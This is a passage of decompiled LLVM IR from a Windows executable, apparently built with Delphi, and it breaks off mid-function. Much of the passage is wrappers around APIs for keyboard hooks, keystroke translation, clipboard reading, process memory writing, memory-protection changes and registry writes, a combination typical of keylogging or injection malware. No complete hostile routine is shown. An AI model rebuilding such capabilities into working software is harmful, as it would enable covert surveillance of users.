define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.26() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.24(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.25(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"() local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
